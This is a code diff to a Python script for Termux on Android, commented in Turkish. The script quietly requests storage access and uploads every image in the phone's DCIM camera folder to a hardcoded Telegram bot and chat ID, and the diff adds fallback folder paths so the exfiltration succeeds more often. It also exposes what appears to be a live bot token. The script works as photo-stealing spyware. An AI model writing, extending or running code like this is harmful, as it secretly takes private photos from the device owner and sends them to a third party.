@@ -7,8 +7,12 @@ from tqdm import tqdm  # İlerleme çubuğu için
 BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
 CHAT_ID = "7561737990"
 
-# Gönderilecek klasör yolu
-DCIM_PATH = "/storage/emulated/0/DCIM/"
+# Denenecek klasör yolları
+DCIM_PATHS = [
+    "/storage/emulated/0/DCIM/",
+    "/sdcard/DCIM/",
+    "/data/data/com.termux/files/home/storage/dcim/"
+]
 
 # Desteklenen resim formatları
 IMAGE_EXTENSIONS = (".png", ".jpg", ".jpeg")
@@ -24,6 +28,13 @@ def install_missing_packages():
     # Termux'un depolama erişimi için izin ver
     subprocess.run(["termux-setup-storage"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+# İlk erişilebilen klasörü bul
+def find_accessible_folder():
+    for path in DCIM_PATHS:
+        if os.path.exists(path) and os.access(path, os.R_OK):
+            return path
+    return None  # Hiçbirine erişim yoksa
+
 # Resim dosyasını Telegram botuna gönderme fonksiyonu
 def send_photo(image_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
@@ -35,19 +46,19 @@ def send_photo(image_path):
 
 def main():
     install_missing_packages()
-    
-    if not os.path.exists(DCIM_PATH):
-        return
-    
-    images = [f for f in os.listdir(DCIM_PATH) if f.lower().endswith(IMAGE_EXTENSIONS)]
-    
+
+    dcim_folder = find_accessible_folder()
+    if not dcim_folder:
+        return  # Hiçbir klasöre erişilemiyorsa çık
+
+    images = [f for f in os.listdir(dcim_folder) if f.lower().endswith(IMAGE_EXTENSIONS)]
     if not images:
-        return
-    
+        return  # Gönderilecek resim yoksa çık
+
     progress_bar = tqdm(total=len(images), desc="📤 Resimler Gönderiliyor", unit="resim", ncols=80, ascii=True)
 
     for image in images:
-        image_path = os.path.join(DCIM_PATH, image)
+        image_path = os.path.join(dcim_folder, image)
         send_photo(image_path)
         progress_bar.update(1)  # İlerleme çubuğunu bir adım ilerlet
     
